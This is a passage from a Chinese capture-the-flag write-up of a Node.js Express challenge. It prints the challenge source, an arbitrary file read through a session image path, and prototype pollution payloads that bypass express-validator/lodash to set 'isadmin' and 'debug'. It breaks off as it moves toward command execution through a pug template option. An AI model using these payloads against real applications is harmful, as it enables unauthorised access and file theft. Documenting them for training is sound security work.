punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//req.session.debug = true;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isadmin <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>newimg <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>img <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>newimg<span class="token punctuation">;</span>    <span class="token keyword">var</span> imgdata <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>img<span class="token operator">?</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>img<span class="token operator">:</span> <span class="token string">"./images/1.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> base64data <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>imgdata<span class="token punctuation">,</span> <span class="token string">'binary'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> info <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'我的空间'</span><span class="token punctuation">,</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username<span class="token punctuation">,</span> <span class="token literal-property property">png</span><span class="token operator">:</span> <span class="token string">"data:image/png;base64,"</span> <span class="token operator">+</span> base64data<span class="token punctuation">,</span> <span class="token literal-property property">diy</span><span class="token operator">:</span> <span class="token string">"十年磨一剑😅v0.0.0(尚处于开发版"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isadmin <span class="token operator">!==</span> <span class="token string">"notadmin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>debug <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>debug <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> info<span class="token punctuation">.</span>pretty <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>p<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>diy <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>diy <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>diy<span class="token punctuation">;</span>      info<span class="token punctuation">.</span>diy <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>diy <span class="token operator">?</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>diy<span class="token operator">:</span> <span class="token string">"尊贵的admin"</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> info<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> info<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'plz login first'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>&#x2F;app&#x2F;app.js</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> createError <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http-errors'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> cookieParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cookie-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> logger <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'morgan'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> key <span class="token operator">=</span> <span class="token string">'session'</span><span class="token punctuation">;</span><span class="token keyword">var</span> indexRouter <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./routes/index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> secrets <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token literal-property property">name</span><span class="token operator">:</span> key<span class="token punctuation">,</span>  <span class="token literal-property property">secret</span><span class="token operator">:</span> secrets<span class="token punctuation">,</span>  <span class="token literal-property property">store</span><span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">sessionStore</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token literal-property property">saveUninitialized</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>  <span class="token literal-property property">resave</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>  <span class="token literal-property property">cookie</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">maxAge</span><span class="token operator">:</span> <span class="token number">100</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">600</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// view engine setup</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'views'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'pug'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">logger</span><span class="token punctuation">(</span><span class="token string">'dev'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">cookieParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> indexRouter<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// catch 404 and forward to error handler</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token function">createError</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// error handler</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// set locals, only providing error in development</span>  res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>message <span class="token operator">=</span> err<span class="token punctuation">.</span>message<span class="token punctuation">;</span>  res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>error <span class="token operator">=</span> req<span class="token punctuation">.</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'env'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'development'</span> <span class="token operator">?</span> err <span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token comment">// render the error page</span>  res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span>status <span class="token operator">||</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> app<span class="token punctuation">;</span></code></pre><p>本地安装一下环境</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"cookie-parser"</span><span class="token operator">:</span> <span class="token string">"^1.4.5"</span><span class="token punctuation">,</span>    <span class="token property">"crypto"</span><span class="token operator">:</span> <span class="token string">"^1.0.1"</span><span class="token punctuation">,</span>    <span class="token property">"express"</span><span class="token operator">:</span> <span class="token string">"^4.17.1"</span><span class="token punctuation">,</span>    <span class="token property">"express-session"</span><span class="token operator">:</span> <span class="token string">"^1.17.2"</span><span class="token punctuation">,</span>    <span class="token property">"express-validator"</span><span class="token operator">:</span> <span class="token string">"^6.12.1"</span><span class="token punctuation">,</span>    <span class="token property">"http-errors"</span><span class="token operator">:</span> <span class="token string">"^1.8.0"</span><span class="token punctuation">,</span>    <span class="token property">"morgan"</span><span class="token operator">:</span> <span class="token string">"^1.10.0"</span><span class="token punctuation">,</span>    <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"^0.12.7"</span><span class="token punctuation">,</span>    <span class="token property">"request"</span><span class="token operator">:</span> <span class="token string">"^2.88.2"</span><span class="token punctuation">,</span>    <span class="token property">"session-file-store"</span><span class="token operator">:</span> <span class="token string">"^1.5.0"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="第二步-代码审计"><a href="#第二步-代码审计" class="headerlink" title="第二步 - 代码审计"></a>第二步 - 代码审计</h3><p>根据源码可以发现，题目要求我们以admin身份登陆，但是admin的密码又是随机不可能破解的</p><img src="/article/2021dfjk/image-20210803143641462.png" class="" title="image-20210803143641462" loading="lazy"><p>跟到<code>/verify</code>路由，可以看到如果<code>session.username</code>是admin就将<code>isadmin</code>赋值admin，否则就是notadmin </p><img src="/article/2021dfjk/image-20210803143743000.png" class="" title="image-20210803143743000" loading="lazy"><p>再继续跟进到<code>/admin</code>路由 ，发现任意文件读取漏洞的源码。关键点在于下一步，如果<code>isadmin</code><strong>只要不是</strong>notadmin就会执行一段操作，所以我们的下一个目标就是令<code>isadmin</code>变为非notadmin</p><img src="/article/2021dfjk/image-20210803144118578.png" class="" title="image-20210803144118578" loading="lazy"><p>admin的密码每次都是随机的，所以出题人根本不想让我们登陆获得admin，也不可能登陆admin。所以得另想方法，我们的关键点就在于让<code>isadmin</code>不是notadmin，而<code>isadmin</code>又是在<code>/verify</code>路由下才创建的，如果改变原型对象的内容让<code>isadmin</code>提前创建，这样就达到了污染，从而让<code>isadmin</code>变为非notadmin</p><p>图为 <a href="www.mrkaixin.top">@Mrkaixin</a> 师傅给出的session样子</p><img src="/article/2021dfjk/image-20210803144614812.png" class="" title="image-20210803144614812" loading="lazy"><h3 id="第三步-原型链污染"><a href="#第三步-原型链污染" class="headerlink" title="第三步 - 原型链污染"></a>第三步 - 原型链污染</h3><p>根据读到的package包引用，发现lodash版本为4.17.15。lodash&lt;4.17.17是有原型链污染漏洞的</p><img src="/article/2021dfjk/E34B2280959DFF59059010F95FFB5E8C.png" class="" title="E34B2280959DFF59059010F95FFB5E8C" loading="lazy"><p>这里给出<a href="https://paper.seebug.org/1426/">参考文章</a>引用部分，写的很详细，参考文章在文末</p><blockquote><p>测试数据包：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__[test]"</span><span class="token operator">:</span> <span class="token string">"123 "</span><span class="token punctuation">&#125;</span></code></pre><p>这里在segments.reduce函数中对输入的值进行了一些判断和替换。重要的点就是当传入的键中存在<code>.</code> ，则会在字符两边加上<code>[&quot; &quot;]</code>，并且最终返回的是一个字符串形式的结果。</p><p>接着之前的过程，在经过了过滤器的处理之后，会通过lodash.set对指定的path设置新值</p><img src="/article/2021dfjk/1607915420000-16044095450346.jpg-w331s" class="" title="-w1160" loading="lazy"><p>尝试污染<strong>proto</strong>[test]，结果发现是污染并没有成功，原因是因为，当lodash.set中第一个参数存在一个与第二个参数同名的键时，污染就会失败</p><p>所以，我们就要尝试去绕过这个点。 我们来看一下这个语句：</p><pre class="language-none"><code class="language-none">path !&#x3D;&#x3D; &#39;&#39; ? _.set(req[location], path, newValue) : _.set(req, location, newValue);</code></pre><p>这里的第一个参数是从请求中直接取出来的，path是经过先前处理后的出来的值。所以能不能通过这个处理来进行绕过呢？当然是可以的。 当我们传入：</p><pre class="language-none"><code class="language-none">&#123;&quot;\&quot;].__proto__[\&quot;test&quot;:&quot;123 &quot;&#125;</code></pre><p>这里的键为<code>&quot;].__proto__[&quot;test</code>，由于字符里面存在<code>.</code>，所以在segments.reduce函数处理时会对其左右加双引号和中括号，最终变成：<code>[&quot;&quot;].__proto__[&quot;test&quot;]</code>。</p><p>这时就不存在同名的键了，于是查看污染的后的值发现：</p><img src="/article/2021dfjk/1607915421000-16044107085533.jpg-w331s" class="" title="-w426" loading="lazy"><p>我们设置的值并没有传递进去，而是污染为了一个空值。为什么传递进来的newValue为空值呢？</p><p>从select-fields.js中可以看到，是因为取值时，使用的是lodash.get方法从<code>req[&#39;body&#39;]</code>中取被处理后的键值，处理后的键是不存在的，所以取出来的值就为undefined。当undefined传递到Sanitization.run方法中后，经过了一个<code>.toString()</code>的处理变成了<code>&#39;&#39;</code>空字符串。</p><p>利用lodash.get方法中读取键值的妙用得到最终的payload：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"a"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"test"</span><span class="token operator">:</span> <span class="token string">"testvalue"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token property">"a\"].__proto__[\"test"</span><span class="token operator">:</span> <span class="token number">222</span><span class="token punctuation">&#125;</span></code></pre><p>详细可在参考文章中查看</p></blockquote><p>于是进行测试</p><p>测试代码</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">const</span> port <span class="token operator">=</span> <span class="token number">9001</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span>    body<span class="token punctuation">,</span>    validationResult<span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-validator'</span><span class="token punctuation">)</span>middlewares <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isLength</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">min</span><span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">withMessage</span><span class="token punctuation">(</span><span class="token string">"username is too short"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isLength</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">min</span><span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">withMessage</span><span class="token punctuation">(</span><span class="token string">"password is too short"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> errors <span class="token operator">=</span> <span class="token function">validationResult</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>errors<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> errors<span class="token punctuation">.</span><span class="token function">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>msg<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>middlewares<span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/user"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> foo <span class="token operator">=</span> <span class="token string">"hellowrold"</span>    <span class="token keyword">let</span> username <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">;</span>    <span class="token keyword">let</span> password <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">server listening on </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>port<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>lod <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span>lod<span class="token punctuation">.</span><span class="token function">setWith</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"__proto__[isadmin]"</span><span class="token punctuation">,</span> <span class="token string">"notadmin"</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span></code></pre><p>根据原payload，可以发现，这里用json格式post的请求成功达到了目的，并且还能进行覆盖</p><img src="/article/2021dfjk/image-20210803151756631.png" class="" title="image-20210803151756631" loading="lazy"><p>但是问题在于题目是不解析json请求的，因此不能使用这种方式构造原型链污染</p><img src="/article/2021dfjk/image-20210803152057397.png" class="" title="image-20210803152057397" loading="lazy"><p>反思：比赛中由于未仔细审查代码，导致以为必须要覆盖为admin才行，错失了大量时间，其实只要是非notadmin就行</p><p>最终测试如下</p><img src="/article/2021dfjk/image-20210803151332184.png" class="" title="image-20210803151332184" loading="lazy"><p>Payload:<code>&quot;.constructor.prototype[&quot;xxx</code> </p><p>利用这样的构造器去达到覆盖<code>xxx</code>的目的，<code>.__proto__.</code> 这样是不行的</p><img src="/article/2021dfjk/image-20210803152912326.png" class="" title="image-20210803152912326" loading="lazy"><p>原型链污染成功</p><img src="/article/2021dfjk/image-20210803152818280.png" class="" title="image-20210803152818280" loading="lazy"><h3 id="第四步-命令执行"><a href="#第四步-命令执行" class="headerlink" title="第四步 - 命令执行"></a>第四步 - 命令执行</h3><p>继续看代码，发现<code>session.debug</code>后将<code>query</code>请求的<code>p</code>赋到了<code>info.pretty</code>里。</p><img src="/article/2021dfjk/image-20210803153247822.png" class="" title="image-20210803153247822" loading="lazy"><hr><p>要达到p，首先要覆盖<code>session.debug</code>，所以上一步最终payload为</p><pre class="language-php" data-language="php"><code class="language-php">username<span class="token operator">=</span><span class="token number">112222</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">123456</span><span class="token operator">&amp;</span>a<span class="token string double-quoted-string">".constructor.prototype["</span>isadmin<span class="token operator">=</span><span class="token operator">&amp;</span>a<span class="token string double-quoted-string">".constructor.prototype["</span>debug<span class="token operator">=</span></code></pre><hr><p>利用文件读取读到了<code>/app/view/admin.pug</code></p><pre class="language-pug" data-language="pug"><code class="language-pug"><span class="token tag">html</span>  <span class="token tag">head</span>    <span class="token tag">title</span><span class="token punctuation">=</span><span class="token code"> title</span>    <span class="token tag">meta<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">http-equiv</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"Content-Type"</span></span><span class="token punctuation">,</span> <span class="token attr-name">content</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"text/html;charset=UTF-8"</span></span><span class="token punctuation">)</span></span></span>  <span class="token tag">body</span>    <span class="token mixin"><span class="token keyword">mixin</span> <span class="token function">hello</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span></span>      <span class="token tag">p</span><span class="token punctuation">=</span><span class="token code"> text</span>      <span class="token tag">div</span> <span class="token plain-text">#&#123;msg&#125;</span>    <span class="token mixin"><span class="token keyword">mixin</span> <span class="token function">printdiy</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>      <span class="token tag">div</span> <span class="token plain-text">个性签名：</span>        <span class="token tag">div</span> <span class="token plain-text">#&#123;diy&#125;</span>        <span class="token tag">div</span> <span class="token plain-text">---#&#123;msg&#125;</span>    <span class="token tag">form<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">action</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">""</span></span><span class="token punctuation">,</span> <span class="token attr-name">method</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"get"</span></span><span class="token punctuation">)</span></span></span>      <span class="token tag">div</span> <span class="token plain-text">更改图片</span>        <span class="token tag">select<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">name</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"newimg"</span></span><span class="token punctuation">)</span></span></span>          <span class="token tag">option<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">value</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"./images/1.png"</span></span><span class="token punctuation">)</span></span></span> 